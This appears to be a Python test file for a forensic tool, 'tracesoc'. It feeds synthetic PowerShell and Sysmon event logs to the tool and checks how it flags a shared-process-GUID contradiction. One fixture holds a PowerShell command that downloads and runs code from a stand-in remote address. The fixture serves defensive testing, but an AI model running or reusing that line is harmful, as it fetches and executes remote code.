from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


REPO = Path(
    __file__
).resolve().parents[2]


def env() -> dict[
    str,
    str,
]:
    result = dict(
        os.environ
    )

    src = str(
        REPO / "src"
    )

    prior = result.get(
        "PYTHONPATH"
    )

    result["PYTHONPATH"] = (
        src
        if not prior
        else (
            src
            + os.pathsep
            + prior
        )
    )

    return result


def powershell_xml() -> str:
    return """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System>
<Provider Name="Microsoft-Windows-PowerShell"/>
<EventID>4104</EventID>
<Version>1</Version>
<Level>3</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0</Keywords>
<TimeCreated SystemTime="2026-09-22T12:00:00.000000Z"/>
<EventRecordID>4104001</EventRecordID>
<Correlation/>
<Execution ProcessID="500" ThreadID="700"/>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>HOST-CONTRADICTION</Computer>
<Security UserID="S-1-5-21-1000"/>
</System>
<EventData>
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">IEX (Invoke-WebRequest http://198.51.100.20:8080/a).Content</Data>
<Data Name="ScriptBlockId">11111111-2222-3333-4444-555555555555</Data>
<Data Name="Path"></Data>
</EventData>
</Event>"""


def sysmon_xml(
    *,
    record_id: int,
    process_guid: str,
    process_id: str,
) -> str:
    return f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System>
<Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/>
<EventID>1</EventID>
<Version>5</Version>
<Level>4</Level>
<Task>1</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2026-09-22T11:59:55.000000Z"/>
<EventRecordID>{record_id}</EventRecordID>
<Correlation/>
<Execution ProcessID="4" ThreadID="8"/>
<Channel>Microsoft-Windows-Sysmon/Operational</Channel>
<Computer>HOST-CONTRADICTION</Computer>
<Security UserID="S-1-5-18"/>
</System>
<EventData>
<Data Name="RuleName">-</Data>
<Data Name="UtcTime">2026-09-22 11:59:55.000</Data>
<Data Name="ProcessGuid">{process_guid}</Data>
<Data Name="ProcessId">{process_id}</Data>
<Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
<Data Name="CommandLine">powershell.exe -NoProfile</Data>
<Data Name="CurrentDirectory">C:\\Users\\User1\\</Data>
<Data Name="User">DOMAIN\\User1</Data>
<Data Name="LogonGuid">{{11111111-1111-1111-1111-111111111111}}</Data>
<Data Name="LogonId">0x12345</Data>
<Data Name="TerminalSessionId">1</Data>
<Data Name="IntegrityLevel">Medium</Data>
<Data Name="Hashes">SHA256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</Data>
<Data Name="ParentProcessGuid">{{BBBBBBBB-CCCC-DDDD-EEEE-FFFFFFFFFFFF}}</Data>
<Data Name="ParentProcessId">400</Data>
<Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
<Data Name="ParentCommandLine">C:\\Windows\\explorer.exe</Data>
<Data Name="ParentUser">DOMAIN\\User1</Data>
</EventData>
</Event>"""


def register(
    output: Path,
    key: str,
) -> dict[
    str,
    object,
]:
    matches = []

    for path in sorted(
        output.glob("*.json")
    ):
        value = json.loads(
            path.read_text(
                encoding="utf-8"
            )
        )

        if (
            isinstance(
                value,
                dict,
            )
            and key in value
        ):
            matches.append(
                value
            )

    if len(matches) != 1:
        raise AssertionError(
            "expected one register for "
            + key
        )

    return matches[0]


def run_case(
    *,
    second_guid: str,
) -> dict[
    str,
    object,
]:
    with tempfile.TemporaryDirectory(
        prefix="tracesoc-contradiction-"
    ) as temporary:
        root = Path(
            temporary
        )

        evidence = (
            root / "evidence"
        )

        output = (
            root / "output"
        )

        evidence.mkdir()

        (
            evidence
            / "powershell.xml"
        ).write_text(
            powershell_xml(),
            encoding="utf-8",
            newline="\n",
        )

        shared = (
            "{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}"
        )

        (
            evidence
            / "sysmon-a.xml"
        ).write_text(
            sysmon_xml(
                record_id=1001,
                process_guid=shared,
                process_id="500",
            ),
            encoding="utf-8",
            newline="\n",
        )

        (
            evidence
            / "sysmon-b.xml"
        ).write_text(
            sysmon_xml(
                record_id=1002,
                process_guid=(
                    second_guid
                ),
                process_id="999",
            ),
            encoding="utf-8",
            newline="\n",
        )

        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "tracesoc",
                "case",
                "analyze",
                str(evidence),
                "--output",
                str(output),
            ],
            cwd=str(REPO),
            env=env(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            check=False,
        )

        if result.returncode != 0:
            raise AssertionError(
                result.stdout
            )

        relationships = register(
            output,
            "relationships",
        )

        hypotheses = register(
            output,
            "hypotheses",
        )

        findings = register(
            output,
            "findings",
        )

        narratives = register(
            output,
            "narratives",
        )

        finding_records = (
            findings[
                "findings"
            ]
        )

        if len(
            finding_records
        ) != 1:
            raise AssertionError(
                "expected one finding"
            )

        finding_id = (
            finding_records[
                0
            ][
                "finding_id"
            ]
        )

        explanation_result = (
            subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "tracesoc",
                    "explain",
                    finding_id,
                    "--case",
                    str(output),
                    "--json",
                ],
                cwd=str(REPO),
                env=env(),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                check=False,
            )
        )

        if (
            explanation_result.returncode
            != 0
        ):
            raise AssertionError(
                explanation_result.stdout
            )

        explanation = json.loads(
            explanation_result.stdout
        )

        return {
            "relationships":
                relationships,
            "hypotheses":
                hypotheses,
            "findings":
                findings,
            "narratives":
                narratives,
            "explanation":
                explanation,
        }


class SourceNativeContradictionTests(
    unittest.TestCase
):
    def test_shared_process_guid_conflict_survives_to_explain(
        self,
    ) -> None:
        shared = (
            "{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}"
        )

        result = run_case(
            second_guid=shared
        )

        relationships = (
            result[
                "relationships"
            ][
                "relationships"
            ]
        )

        contradictions = [
            item
            for item
            in relationships
            if (
                item[
                    "relationship_type"
                ]
                == "CONTRADICTS"
            )
        ]

        self.assertEqual(
            len(
                contradictions
            ),
            1,
        )

        contradiction = (
            contradictions[
                0
            ]
        )

        self.assertEqual(
            contradiction[
                "predicate_version"
            ],
            (
                "TRC-CONTRADICTION-001@1.0.0"
            ),
        )

        anchors = {
            item[
                "anchor_type"
            ]
            for item
            in contradiction[
                "anchors"
            ]
        }

        self.assertIn(
            "process_guid",
            anchors,
        )

        self.assertIn(
            "conflicting_process_id",
            anchors,
        )

        contradiction_id = (
            contradiction[
                "relationship_id"
            ]
        )

        hypothesis = (
            result[
                "hypotheses"
            ][
                "hypotheses"
            ][
                0
            ]
        )

        finding = (
            result[
                "findings"
            ][
                "findings"
            ][
                0
            ]
        )

        narrative = (
            result[
                "narratives"
            ][
                "narratives"
            ][
                0
            ]
        )

        explanation = (
            result[
                "explanation"
            ]
        )

        self.assertEqual(
            hypothesis[
                "contradicting_relationship_ids"
            ],
            [
                contradiction_id
            ],
        )

        self.assertEqual(
            finding[
                "contradicting_relationship_ids"
            ],
            [
                contradiction_id
            ],
        )

        self.assertEqual(
            narrative[
                "uncertainty"
            ][
                "contradicting_relationship_ids"
            ],
            [
                contradiction_id
            ],
        )

        self.assertEqual(
            [
                item[
                    "relationship_id"
                ]
                for item
                in explanation[
                    "contradicting_relationships"
                ]
            ],
            [
                contradiction_id
            ],
        )

        self.assertEqual(
            explanation[
                "reverse_proof"
            ][
                "raw_locator_count"
            ],
            3,
        )

        self.assertEqual(
            explanation[
                "claim_boundary"
            ][
                "incident_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            explanation[
                "claim_boundary"
            ][
                "malicious_intent_status"
            ],
            "NOT_ESTABLISHED",
        )

    def test_different_process_guid_is_not_a_contradiction(
        self,
    ) -> None:
        result = run_case(
            second_guid=(
                "{99999999-BBBB-CCCC-DDDD-EEEEEEEEEEEE}"
            )
        )

        contradictions = [
            item
            for item
            in result[
                "relationships"
            ][
                "relationships"
            ]
            if (
                item[
                    "relationship_type"
                ]
                == "CONTRADICTS"
            )
        ]

        self.assertEqual(
            contradictions,
            [],
        )

        self.assertEqual(
            result[
                "hypotheses"
            ][
                "hypotheses"
            ][
                0
            ][
                "contradicting_relationship_ids"
            ],
            [],
        )

        self.assertEqual(
            result[
                "explanation"
            ][
                "contradicting_relationships"
            ],
            [],
        )
